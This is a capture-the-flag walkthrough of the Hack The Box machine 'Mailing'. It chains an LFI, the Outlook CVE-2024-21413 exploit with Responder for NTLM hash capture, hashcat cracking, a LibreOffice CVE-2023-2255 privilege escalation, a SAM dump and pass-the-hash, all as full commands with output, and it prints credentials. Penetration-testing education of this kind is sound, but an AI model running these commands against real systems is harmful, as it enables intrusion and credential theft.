#HacktheBox  (Worst machine as an Easy box)

Starting with Nmap to scan for open ports:

```bash
nmap -sT -Pn -p- --min-rate 10000 10.10.11.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 03:06 EDT
Nmap scan report for 10.10.11.14
Host is up (0.16s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds
```

Doing Full Scan:

```bash
sudo nmap -sC -sV -p25,80,110,135,139,143,445,465,587,993,5040,7680,49664,49665,49666,49667,49668,49669 10.10.11.14 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 03:11 EDT
Nmap scan report for 10.10.11.14
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: SORT QUOTA NAMESPACE OK completed CAPABILITY IMAP4rev1 IDLE RIGHTS=texkA0001 ACL CHILDREN IMAP4
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -12s
| smb2-time: 
|   date: 2024-06-17T07:13:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.91 seconds
```

Now i try to enumerate smtp but no use so i try to enumerate 80:

```bash
dirsearch -u http://mailing.htb/ -x 403,404,400
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HTB/Mailing/reports/http_mailing.htb/__24-06-17_03-36-50.txt

Target: http://mailing.htb/

[03:36:50] Starting: 
[03:37:31] 200 -  541B  - /assets/                                          
[03:37:31] 301 -  160B  - /assets  ->  http://mailing.htb/assets/           
[03:37:47] 200 -   31B  - /download.php                                     
                                                                             
Task Completed

```

In assets there are some images like wallpaper 

To access the download.php parameters are required:

So i visit to homepage and intercept the download button and after i see the parameter is file and  i try for LFI vuln.

![](images/Pasted%20image%2020240617133911.png)

Now trying diff payloads:

![](images/Pasted%20image%2020240617140245.png)

```bash
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7

[Database]

Type=MSSQLCE

Username=

Password=0a9f8ad8bf896b501dde74f08efd7e4c
```
I crack the hash using hash crack and the pass of administrator is : homenetworkingadministrator

Go back to port 80 earlier and open the instruction.pdf ( download the most BWH button )

![](images/Pasted%20image%2020240617140731.png)

Here we know if we send an email later with virtual auto view ( we assume there is a bot to auto see every new message )

Here I thought of this new exploit in Email Services Outlook. ( I know from the htb forum given a hint :v )

https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability?tab=readme-ov-file

Before exploiting the CVE we have to start responder 

```bash
sudo responder -I tun0 -v

```

```bash
python3 exploit.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.4" --subject XD
```

You may need to send the mail multiple times to receive a response at responder, and it will look something like this.

```bash
[SMB] NTLMv2-SSP Client : 10.10.11.14  
[SMB] NTLMv2-SSP Username : MAILING\maya  
[SMB] NTLMv2-SSP Hash : maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000  
[*] Skipping previously captured hash for MAILING\maya

```

Now  we will try to crack NTLMv2 hash we got for maya using hashcat.

```bash
hashcat -a 0 -m 5600 maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000 /usr/share/wordlists/rockyou.txt
```
![](images/Pasted%20image%2020240617142327.png)

Here i get maya pass aslo:

Now we know the credentials of maya and in the above nmap scan we saw port 5985 open, so we can use evil-winrm to connect the powershell.

```bash
evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> whoami
mailing\maya

```

![](images/Pasted%20image%2020240617142701.png)

here i check this mail.py but i cant find anything

![](images/Pasted%20image%2020240617142901.png)

Here for prev esc i try many things but failed and i move for help and i find libreoffice file version:

![](images/Pasted%20image%2020240617143435.png)

Now i search for an exploit and i found one:

https://github.com/elweth-sec/CVE-2023-2255

Here i have to download the whole repo then run the script:

```bash
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'

File exploit.odt has been created !

```

Here i start python server to transfer the file then:

```bash
*Evil-WinRM* PS C:\Important Documents> Invoke-WebRequest http://10.10.16.4:8000/exploit.odt -OutFile exploit.odt
*Evil-WinRM* PS C:\Important Documents> ls
*Evil-WinRM* PS C:\Important Documents> curl http://10.10.16.4:8000/exploit.odt -o exploit.odt
*Evil-WinRM* PS C:\Important Documents> ls


    Directory: C:\Important Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/17/2024   1:21 PM          30526 exploit.odt

```

Here it's strange that Invoke command run but didn't give me any output so i use curl.

First check user groups before running the exploit.

Here someone already make maya Administrator so i am just writing commands to make maya admin.

```bash
Evil-WinRM* PS C:\Important Documents> ./exploit.odt
```

```powershell
 net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-06-17 1:23:11 PM

Logon hours allowed          All

Local Group Memberships      *Administradores      *Remote Management Use
                             *Usuarios             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.

```

Here we see maya is now admin so , We will take the help of crackmapexec to get the local admin hash.

```bash
crackmapexec smb 10.10.11.14 -u maya -p "m4y4ngs4ri" --sam
SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
SMB         10.10.11.14     445    MAILING          [+] Dumping SAM hashes
SMB         10.10.11.14     445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database

```

We will use this local admin hash using impacket-wmiexec tool for remote connection to our host as a root.

```powershell
impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"
```

![](images/Pasted%20image%2020240617165923.png)

![](images/Pasted%20image%2020240617165939.png)
